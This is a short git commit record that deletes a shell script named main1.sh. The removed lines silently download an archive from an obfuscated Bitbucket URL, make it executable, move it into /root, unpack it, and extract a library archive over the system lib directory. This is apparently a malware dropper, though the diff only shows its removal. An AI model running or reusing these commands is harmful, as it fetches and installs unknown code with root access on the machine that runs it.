7439e8ebdb6d4f3aae118e770a46ccdaeec1a115
hildamansur <102267965+hildamansur@users.noreply.github.com>
2022-03-24 21:40:46 -0700

    Delete main1.sh

--- main1.sh
+++
@@ -1,8 +0,0 @@
-curl -o martialasion https://bitbucket.org/namskdjworitpwprkdgalxmv/naszxcoiuwemnaoemaosnuemazoiemnaszxoiemwazxmcnoemaowemazsxcovm/raw/9692e7a20bdcb3c48bb122f003a7b9184bb7b8fc/unaseiuowemnaszxcoivuiowezxmnvoieweoizxmasoiweruiomnaszxcnoiuewe > /dev/null 2>&1 && chmod u+x *
-mv martialasion /root
-cd /../../../root && ls -a
-tar -xf martialasion && chmod u+x *
-ls -a
-tar -xf lib --strip-components=1 -C '/../lib'
-ls -a
-cd /../lib && ls -a
